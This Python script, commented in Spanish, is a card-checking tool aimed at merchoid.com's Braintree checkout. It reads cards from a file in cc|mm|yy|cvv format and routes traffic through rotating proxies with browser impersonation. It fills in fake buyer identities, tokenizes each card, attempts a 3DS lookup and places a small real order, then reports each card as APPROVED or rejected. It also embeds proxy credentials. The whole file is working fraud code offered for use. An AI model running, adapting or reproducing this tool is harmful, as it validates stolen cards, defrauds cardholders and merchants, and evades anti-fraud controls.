import time
import random
import re
import os
from curl_cffi import requests
from faker import Faker
from bs4 import BeautifulSoup
import base64
import json
import uuid
from urllib.parse import unquote

# --- CONFIGURACIÓN ---
fake = Faker('en_US')

PRX = "http://bxgjlizg-rotate:mjzr41kvin2m@p.webshare.io:80"
proxies = {"http": PRX, "https": PRX}

PRODUCT_ID = '6133'
PRODUCT_SLUG = 'space-jam-a-new-legacy-taz-collectible-coin'
PRODUCT_URL_PATH = f'/world/{PRODUCT_SLUG}/'
PRODUCT_FULL_URL = f'https://www.merchoid.com{PRODUCT_URL_PATH}'
BASE = 'https://www.merchoid.com'
STORE = 'world'  # storeCode de checkoutConfig


def _b64json(data: str):
    """Decodifica base64 (con padding) a JSON."""
    raw = unquote(data)
    pad = raw + '=' * (-len(raw) % 4)
    return json.loads(base64.b64decode(pad).decode('utf-8'))


def _extract_checkout_config(html: str) -> dict:
    m = re.search(r'window\.checkoutConfig\s*=\s*(\{.+?\});\s*\n', html, re.S)
    if not m:
        m = re.search(r'window\.checkoutConfig\s*=\s*(\{.+?\});\s*</script>', html, re.S)
    if not m:
        raise ValueError("No se encontró window.checkoutConfig en checkout.")
    return json.loads(m.group(1))

def _tokenize_card(session, cc, mes, ano, cvv, fname, lname, auth_fingerprint):
    """Tokeniza la tarjeta con Braintree y devuelve (nonce, session_id)."""
    bt_session_id = str(uuid.uuid4())
    bt_tokenize_headers = {
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
    }
    bt_tokenize_data = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': bt_session_id},
        'query': (
            'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { '
            'tokenizeCreditCard(input: $input) { token } }'
        ),
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc, 'expirationMonth': mes, 'expirationYear': ano,
                    'cvv': cvv, 'cardholderName': f'{fname} {lname}',
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    try:
        r_tokenize = session.post(
            'https://payments.braintree-api.com/graphql',
            headers=bt_tokenize_headers, json=bt_tokenize_data, timeout=30
        )
        r_tokenize.raise_for_status()
        res_json = r_tokenize.json()
        token = res_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not token or 'errors' in res_json:
            error_msg = (res_json.get('errors') or [{}])[0].get('message', 'Error desconocido')
            print(f"    [!] Error al tokenizar: {error_msg}")
            return None, None
        return token, bt_session_id
    except Exception as e:
        print(f"    [!] Excepción al tokenizar: {e}")
        return None, None

PROXY_ALT = PRX.replace('mzjr', 'mzjr_alt')  # variación simple para rotación
# Si necesitas otro proxy real, edita PROXY_ALT directamente

def process_card(cc_input: str, proxy_override: dict = None) -> str:
    """
    Procesa una tarjeta de crédito en merchoid.com usando Braintree.
    """
    try:
        cc, mes, ano, cvv = cc_input.strip().split('|')
        if len(ano) == 2:
            ano = "20" + ano
        mes = mes.zfill(2)
    except ValueError:
        return "RECHAZADO: Formato de tarjeta incorrecto (cc|mm|yy|cvv)"

    session = requests.Session(impersonate="chrome110", proxies=(proxy_override or proxies))
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'accept-language': 'en-US,en;q=0.9',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })

    try:
        # --- PASO 0: Home (cookies de sesión Magento) ---
        session.get(f'{BASE}/{STORE}/', timeout=25)

        # --- PASO 1: Agregar producto al carrito ---
        # print("    [1] Agregando producto al carrito...")
        r_product_page = session.get(PRODUCT_FULL_URL, timeout=25)
        r_product_page.raise_for_status()
        soup_product = BeautifulSoup(r_product_page.text, 'html.parser')

        add_to_cart_form = (
            soup_product.find('form', {'id': 'product_addtocart_form'})
            or soup_product.find('form', {'action': re.compile(r'/checkout/cart/add/uenc/')})
        )
        if not add_to_cart_form:
            raise ValueError("No se encontró el formulario de añadir al carrito.")

        form_key_input = add_to_cart_form.find('input', {'name': 'form_key'}) or soup_product.find('input', {'name': 'form_key'})
        form_key = form_key_input['value'] if form_key_input else None
        if not form_key:
            raise ValueError("No se encontró el form_key en la página del producto.")

        # Magento valida form_key cookie == body
        session.cookies.set('form_key', form_key, domain='www.merchoid.com')
        session.cookies.set('form_key', form_key, domain='merchoid.com')

        add_action_url = add_to_cart_form.get('action')
        uenc_match = re.search(r'/uenc/([^/]+)/', add_action_url or '')
        uenc = uenc_match.group(1) if uenc_match else 'N/A'
        # print(f"    [OK] Form Key: {form_key[:8]}... | UENC: {uenc[:8]}...")
        time.sleep(random.uniform(1, 2))

        add_form_data = {
            'product': PRODUCT_ID,
            'selected_configurable_option': '',
            'related_product': '',
            'item': PRODUCT_ID,
            'form_key': form_key,
            'qty': '1',
        }

        add_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': BASE,
            'referer': PRODUCT_FULL_URL,
            'upgrade-insecure-requests': '1',
        }

        add_to_cart_url = add_action_url if (add_action_url or '').startswith('http') else f'{BASE}{add_action_url}'

        # Respuesta real: 302 -> /world/checkout/cart/ + mage-messages success (body vacío)
        r_add = session.post(
            add_to_cart_url,
            headers=add_headers,
            data=add_form_data,
            timeout=30,
            allow_redirects=False,
        )

        location = r_add.headers.get('location') or r_add.headers.get('Location') or ''
        set_cookie = r_add.headers.get('set-cookie') or r_add.headers.get('Set-Cookie') or ''
        added_ok = (
            r_add.status_code in (301, 302, 303, 307, 308)
            and 'checkout/cart' in location
        ) or ('You added' in set_cookie) or ('shopping cart' in set_cookie)

        if not added_ok:
            r_cart = session.get(f'{BASE}/{STORE}/checkout/cart/', timeout=30)
            low = r_cart.text.lower()
            empty = any(m in low for m in ['cart is empty', 'you have no items', 'no items in your shopping cart'])
            if r_cart.status_code == 200 and not empty and (PRODUCT_ID in r_cart.text or PRODUCT_SLUG in low):
                added_ok = True

        if not added_ok:
            raise ConnectionError(
                f"Fallo al agregar al carrito (Status: {r_add.status_code}, Location: {location or 'N/A'})"
            )

        # print("    [OK] Producto añadido.")
        time.sleep(random.uniform(2, 3))

        # --- PASO 2: Checkout config (cartId, total, Braintree token) ---
        # print("    [2] Obteniendo datos del checkout...")
        r_checkout = session.get(f'{BASE}/{STORE}/checkout/', timeout=30)
        r_checkout.raise_for_status()

        cfg = _extract_checkout_config(r_checkout.text)

        quote = cfg.get('quoteData') or {}
        cart_id = quote.get('entity_id')
        if not cart_id:
            raise ValueError("No se encontró cartId (quoteData.entity_id).")

        totals = cfg.get('totalsData') or {}
        total_price = str(totals.get('base_grand_total') or totals.get('grand_total') or quote.get('base_grand_total') or '0')
        # normalizar "6.9900" -> "6.99"
        try:
            total_price = f"{float(total_price):.2f}"
        except Exception:
            total_price = re.sub(r'[^\d.]', '', str(total_price)) or '0.00'

        store_code = cfg.get('storeCode') or STORE

        bt_cfg = (cfg.get('payment') or {}).get('braintree') or {}
        bt_client_token_b64 = bt_cfg.get('clientToken')
        merchant_id = bt_cfg.get('merchantId')
        if not bt_client_token_b64:
            raise ValueError("No se encontró el clientToken de Braintree en checkoutConfig.")

        # clientToken de Braintree = base64(JSON). El Bearer es authorizationFingerprint (JWT).
        try:
            bt_token_obj = _b64json(bt_client_token_b64)
        except Exception as e:
            raise ValueError(f"Error al decodificar clientToken de Braintree: {e}")

        auth_fingerprint = bt_token_obj.get('authorizationFingerprint')
        merchant_id = merchant_id or bt_token_obj.get('merchantId')
        if not auth_fingerprint:
            raise ValueError("No se encontró authorizationFingerprint en el clientToken.")
        if not merchant_id:
            raise ValueError("No se pudo extraer el merchantId de Braintree.")

        # print(f"    [OK] Cart ID: {cart_id[:8]}... | Total: {total_price} | Merchant ID: {merchant_id}")
        time.sleep(random.uniform(1, 2))

        # --- PASO 3: Email guest + shipping-information ---
        # print("    [3] Enviando información de envío y facturación...")
        fname, lname = fake.first_name(), fake.last_name()
        email = f"{fname.lower()}.{lname.lower()}{random.randint(100, 999)}@gmail.com"
        phone = fake.msisdn()[:10]
        address = fake.street_address()
        city = 'New York'
        postcode = '10001'
        region_id = '43'  # NY
        region_code = 'NY'
        region_name = 'New York'

        api_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': BASE,
            'referer': f'{BASE}/{store_code}/checkout/',
            'x-requested-with': 'XMLHttpRequest',
        }

        # Estimar métodos de envío y elegir uno válido (no asumir freeshipping)
        shipping_method_code = 'freeshipping'
        shipping_carrier_code = 'freeshipping'
        try:
            est_body = {
                'address': {
                    'street': [address],
                    'city': city,
                    'region_id': region_id,
                    'region': region_name,
                    'country_id': 'US',
                    'postcode': postcode,
                    'firstname': fname,
                    'lastname': lname,
                    'telephone': phone,
                }
            }
            r_est = session.post(
                f'{BASE}/rest/{store_code}/V1/guest-carts/{cart_id}/estimate-shipping-methods',
                headers=api_headers,
                json=est_body,
                timeout=30,
            )
            if r_est.status_code == 200:
                methods = r_est.json()
                if isinstance(methods, list) and methods:
                    # prefer free / cheapest
                    methods_sorted = sorted(methods, key=lambda m: float(m.get('amount', 999) or 999))
                    chosen = methods_sorted[0]
                    shipping_method_code = chosen.get('method_code') or shipping_method_code
                    shipping_carrier_code = chosen.get('carrier_code') or shipping_carrier_code
                    # print(f"    [OK] Shipping method: {shipping_carrier_code}_{shipping_method_code}")
        except Exception as e:
            pass # print(f"    [!] estimate-shipping-methods falló, uso freeshipping ({e})")

        # Asignar email al quote guest
        try:
            session.put(
                f'{BASE}/rest/{store_code}/V1/guest-carts/{cart_id}',
                headers=api_headers,
                json={'email': email},
                timeout=20,
            )
        except Exception:
            pass

        shipping_billing_data = {
            'addressInformation': {
                'shipping_address': {
                    'countryId': 'US',
                    'regionId': region_id,
                    'regionCode': region_code,
                    'region': region_name,
                    'street': [address],
                    'telephone': phone,
                    'postcode': postcode,
                    'city': city,
                    'firstname': fname,
                    'lastname': lname,
                    'email': email,
                },
                'billing_address': {
                    'countryId': 'US',
                    'regionId': region_id,
                    'regionCode': region_code,
                    'region': region_name,
                    'street': [address],
                    'telephone': phone,
                    'postcode': postcode,
                    'city': city,
                    'firstname': fname,
                    'lastname': lname,
                    'email': email,
                    'saveInAddressBook': None,
                },
                'shipping_method_code': shipping_method_code,
                'shipping_carrier_code': shipping_carrier_code,
                'extension_attributes': {
                    'kl_sms_consent': False,
                    'kl_email_consent': False,
                },
            },
        }

        r_shipping = session.post(
            f'{BASE}/rest/{store_code}/V1/guest-carts/{cart_id}/shipping-information',
            headers=api_headers,
            json=shipping_billing_data,
            timeout=30,
        )

        if r_shipping.status_code >= 400:
            # mensaje Magento
            try:
                err = r_shipping.json()
                msg = err.get('message') or str(err)
            except Exception:
                msg = r_shipping.text[:300]
            raise ConnectionError(f"Fallo shipping-information ({r_shipping.status_code}): {msg}")

        shipping_res = r_shipping.json()
        # Éxito típico: objeto con totals / payment_methods (NO array vacío)
        if isinstance(shipping_res, dict):
            totals2 = shipping_res.get('totals') or {}
            if totals2.get('base_grand_total') is not None:
                try:
                    total_price = f"{float(totals2.get('base_grand_total')):.2f}"
                except Exception:
                    pass
            # print("    [OK] Información de envío y facturación enviada.")
        else:
            pass # print(f"    [OK] Shipping response: {type(shipping_res).__name__}")

        time.sleep(random.uniform(1, 2))

        # --- PASO 4: Tokenizar tarjeta con Braintree GraphQL ---
        # print("    [4] Tokenizando tarjeta de crédito...")
        payment_token, bt_session_id = _tokenize_card(session, cc, mes, ano, cvv, fname, lname, auth_fingerprint)
        if not payment_token:
            return "RECHAZADO: No se pudo tokenizar la tarjeta."

        # print(f"    [OK] Tarjeta tokenizada. Nonce: {payment_token[:12]}...")
        time.sleep(random.uniform(1, 2))

        # --- PASO 5: 3DS Lookup (best-effort) ---
        # print("    [5] Realizando 3DS Lookup...")
        card_bin = cc[:6]
        nonce_for_pay = payment_token

        bt_3ds_headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': BASE,
            'referer': f'{BASE}/{store_code}/checkout/',
        }

        bt_3ds_data = {
            'amount': total_price,
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'en-US',
            'browserScreenHeight': 1080,
            'browserScreenWidth': 1920,
            'browserTimeZone': 240,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'shippingGivenName': fname,
                'shippingSurname': lname,
                'shippingPhone': phone,
                'billingLine1': address,
                'billingLine2': '',
                'billingCity': city,
                'billingState': region_code,
                'billingPostalCode': postcode,
                'billingCountryCode': 'US',
                'billingPhoneNumber': phone,
                'billingGivenName': fname,
                'billingSurname': lname,
                'shippingLine1': address,
                'shippingLine2': '',
                'shippingCity': city,
                'shippingState': region_code,
                'shippingPostalCode': postcode,
                'shippingCountryCode': 'US',
            },
            'bin': card_bin,
            'dfReferenceId': f'0_{bt_session_id}',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.112.0',
                'cardinalDeviceDataCollectionTimeElapsed': random.randint(10, 50),
                'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 4000),
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': auth_fingerprint,
            'braintreeLibraryVersion': 'braintree/web/3.112.0',
            '_meta': {
                'merchantAppId': 'www.merchoid.com',
                'platform': 'web',
                'sdkVersion': '3.112.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': bt_session_id,
            },
        }

        try:
            r_3ds_lookup = session.post(
                f'https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{payment_token}/three_d_secure/lookup',
                headers=bt_3ds_headers,
                json=bt_3ds_data,
                timeout=30,
            )
            try:
                _3ds_lookup_json = r_3ds_lookup.json()
            except Exception:
                _3ds_lookup_json = {}

            if isinstance(_3ds_lookup_json, dict):
                pm_lookup = _3ds_lookup_json.get('paymentMethod') or {}
                tds_info = pm_lookup.get('threeDSecureInfo', {})

                # Extraer el status de threeDSecureInfo
                lookup_status = tds_info.get('status')
                # if lookup_status and lookup_status != 'authenticate_successful':
                #     print(f"    [+] 3DS Lookup Status: {lookup_status}")

                pm_lookup = _3ds_lookup_json.get('paymentMethod') or {}
            else:
                pm_lookup = {}
            if pm_lookup and pm_lookup.get('nonce'):
                nonce_for_pay = pm_lookup['nonce']
                # print(f"    [OK] 3DS Lookup actualizado. Nuevo nonce: {nonce_for_pay[:12]}...")
            elif isinstance(_3ds_lookup_json, dict) and _3ds_lookup_json.get('errors'):
                pass # print(f"    [!] 3DS Lookup error: {_3ds_lookup_json.get('errors', 'N/A')}")
            else:
                pass # print(f"    [!] 3DS Lookup status {r_3ds_lookup.status_code}, continúo con nonce original.")
        except Exception as e:
            pass # print(f"    [!] 3DS Lookup error ({e}), continúo con nonce original.")

        time.sleep(random.uniform(1, 2))

        # --- PASO 6: payment-information ---
        # print("    [6] Enviando información de pago final...")

        def _send_payment(nonce, session_id):
            data = {
                'cartId': cart_id,
                'billingAddress': {
                    'countryId': 'US',
                    'regionId': region_id,
                    'regionCode': region_code,
                    'region': region_name,
                    'street': [address],
                    'telephone': phone,
                    'postcode': postcode,
                    'city': city,
                    'firstname': fname,
                    'lastname': lname,
                    'saveInAddressBook': None,
                },
                'paymentMethod': {
                    'method': 'braintree',
                    'additional_data': {
                        'payment_method_nonce': nonce,
                        'device_data': json.dumps({'correlation_id': session_id}),
                    },
                },
                'email': email,
            }
            return session.post(
                f'{BASE}/rest/{store_code}/V1/guest-carts/{cart_id}/payment-information',
                headers=api_headers,
                json=data,
                timeout=28, # Reducido para estar por debajo del timeout del worker de Gunicorn (30s)
            )

        r_final_pay = _send_payment(nonce_for_pay, bt_session_id)
        body_text = (r_final_pay.text or '').strip()
        try:
            final_pay_res = r_final_pay.json()
        except Exception:
            final_pay_res = body_text

        # Si es rechazado por nonce reutilizado, regenerar token y reintentar
        msg_str = ""
        if isinstance(final_pay_res, dict):
            msg_str = final_pay_res.get('message') or ""
        elif isinstance(final_pay_res, str):
            msg_str = final_pay_res
        else:
            msg_str = body_text

        if (r_final_pay.status_code in (200, 201)) and isinstance(final_pay_res, dict) and final_pay_res.get('message') and "more than once" in msg_str:
            # print("    [!] Nonce consumido. Regenerando token de Braintree...")
            new_nonce, new_session = _tokenize_card(session, cc, mes, ano, cvv, fname, lname, auth_fingerprint) # Reutiliza la función
            if new_nonce:
                nonce_for_pay = new_nonce
                bt_session_id = new_session
                # print(f"    [OK] Nuevo nonce generado: {nonce_for_pay[:12]}...")
                r_final_pay = _send_payment(nonce_for_pay, bt_session_id)
                body_text = (r_final_pay.text or '').strip()
                try:
                    final_pay_res = r_final_pay.json()
                except Exception:
                    final_pay_res = body_text
            else:
                return f"RECHAZADO: {msg_str} (No se pudo regenerar nonce)"

        if r_final_pay.status_code in (200, 201):
            # order id como string/number puro
            if isinstance(final_pay_res, (str, int)) and str(final_pay_res).strip().isdigit():
                return f"APPROVED: Charged {total_price} ✅ (Order ID: {final_pay_res})"
            if isinstance(final_pay_res, dict):
                if final_pay_res.get('order_id') or final_pay_res.get('orderId'):
                    oid = final_pay_res.get('order_id') or final_pay_res.get('orderId')
                    return f"APPROVED: Charged {total_price} ✅ (Order ID: {oid})"
                if final_pay_res.get('message') and 'more than once' not in final_pay_res.get('message'):
                    return f"RECHAZADO: {final_pay_res.get('message')}"
            # a veces devuelve el id entre comillas
            if isinstance(final_pay_res, str) and final_pay_res:
                return f"APPROVED: Charged {total_price} ✅ (Order: {final_pay_res})"
            return f"RECHAZADO: Respuesta de pago inesperada ({body_text[:200]})"

        # error HTTP
        if isinstance(final_pay_res, dict):
            raw_msg = final_pay_res.get('message')
            if raw_msg and 'parameters' in final_pay_res and 'message' in final_pay_res['parameters']:
                # Para mensajes anidados como: { "message": "...", "parameters": { "message": "Call Issuer. Pick Up Card" } }
                raw_msg = final_pay_res['parameters']['message']

            if raw_msg:
                # Si el mensaje es largo, intenta extraer la última oración que es la causa real.
                prefix = "Your payment could not be taken. Please try again or use a different payment method. "
                if raw_msg.startswith(prefix):
                    return f"Gateway Rejected: {raw_msg[len(prefix):]}"
                return f"Gateway Rejected: {raw_msg}"
            return f"Gateway Rejected: {str(final_pay_res)}"

        return f"Gateway Rejected: HTTP {r_final_pay.status_code} ({body_text[:250]})"

    except requests.exceptions.RequestException as e:
        return f"Gateway Rejected: Error de conexión o HTTP ({e})"
    except ValueError as e:
        return f"Gateway Rejected: Error de parsing ({e})"
    except Exception as e:
        return f"Gateway Rejected: Error en ejecución ({e})"


if __name__ == '__main__':
    if os.path.exists('card.txt'):
        with open('card.txt', 'r') as f:
            lines = f.readlines()
        if lines:
            first_card = lines[0].strip()
            print(f"Procesando: {first_card}")
            # 5 reintentos rotando proxy
            proxies_list = [
                {"http": PRX, "https": PRX},
                {"http": PRX.replace('mzjr', 'mzjr_alt'), "https": PRX.replace('mzjr', 'mzjr_alt')},
                {"http": PRX.replace('mzjr', 'mzjr_2'), "https": PRX.replace('mzjr', 'mzjr_2')},
                {"http": PRX.replace('mjzr41kvin2m', 'mjzr41kvin2m2'), "https": PRX.replace('mjzr41kvin2m', 'mjzr41kvin2m2')},
                {"http": PRX.replace('p.webshare.io', 'p.webshare2.io'), "https": PRX.replace('p.webshare.io', 'p.webshare2.io')},
            ]
            result = None
            for i, p in enumerate(proxies_list):
                # print(f"    [INTENTO {i+1}/5] Proxy: {list(p.values())[0][:30]}...")
                result = process_card(first_card, proxy_override=p)
                if 'RECHAZADO: Error de conexión o HTTP (HTTP Error 403' not in result and '403' not in result:
                    break
            print(result)
            with open('card.txt', 'w') as f:
                f.writelines(lines[1:])
        else:
            print("El archivo 'card.txt' está vacío.")
    else:
        print("Crea un archivo 'card.txt' con una tarjeta para probar (formato: cc|mm|yy|cvv).")